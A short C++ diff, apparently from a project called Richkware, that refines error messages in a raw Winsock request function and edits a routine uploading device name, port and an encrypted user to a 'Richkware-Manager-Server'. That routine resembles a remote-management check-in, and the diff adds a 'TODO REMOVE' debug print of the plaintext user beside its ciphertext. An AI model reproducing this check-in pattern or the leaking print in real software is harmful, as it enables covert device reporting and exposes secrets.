@@ -60,7 +60,7 @@ std::string Network::RawRequest(const std::string& serverAddress,  const std::st
     // Initialize Winsock
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (iResult != 0) {
-        return "Error";
+        return "Error: WSAStartup";
     }
 
     ZeroMemory(&hints, sizeof(hints));
@@ -72,7 +72,7 @@ std::string Network::RawRequest(const std::string& serverAddress,  const std::st
     iResult = getaddrinfo(serverAddress.c_str(), port.c_str(), &hints, &result);
     if (iResult != 0) {
         WSACleanup();
-        return "Error";
+        return "Error: getaddrinfo";
     }
 
     // Attempt to connect to an address until one succeeds
@@ -83,7 +83,7 @@ std::string Network::RawRequest(const std::string& serverAddress,  const std::st
                                ptr->ai_protocol);
         if (ConnectSocket == INVALID_SOCKET) {
             WSACleanup();
-            return "Error";
+            return "Error: socket";
         }
 
         // Connect to server.
@@ -99,7 +99,7 @@ std::string Network::RawRequest(const std::string& serverAddress,  const std::st
     freeaddrinfo(result);
     if (ConnectSocket == INVALID_SOCKET) {
         WSACleanup();
-        return "Error";
+        return "Error: connect";
     }
 
     // Send an initial buffer
@@ -107,7 +107,7 @@ std::string Network::RawRequest(const std::string& serverAddress,  const std::st
     if (iResult == SOCKET_ERROR) {
         closesocket(ConnectSocket);
         WSACleanup();
-        return "Error";
+        return "Error: send";
     }
 
     // Receive until the peer closes the connection
@@ -130,7 +130,7 @@ std::string Network::RawRequest(const std::string& serverAddress,  const std::st
     if (iResult == SOCKET_ERROR) {
         closesocket(ConnectSocket);
         WSACleanup();
-        return "Error";
+        return "Error: shutdown";
     }
 
     // cleanup
@@ -160,6 +160,8 @@ Network::UploadInfoToRMS(const std::string &serverAddress, const std::string &po
     //std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";
 
     std::string associatedUserS = crypto.Encrypt(associatedUser);
+    // TODO REMOVE
+    std::cout << "associatedUser " << associatedUser << " " << associatedUserS << std::endl;
 
     std::string packet = "PUT /Richkware-Manager-Server/device?data0=" + name +
                          "&data1=" + serverPortS +
@@ -172,7 +174,6 @@ Network::UploadInfoToRMS(const std::string &serverAddress, const std::string &po
 
     std::string response = RawRequest(serverAddress, port, packet);
     std::cout<<response<<std::endl;
-    std::cout<<packet<<std::endl;
     return true;
 }
 
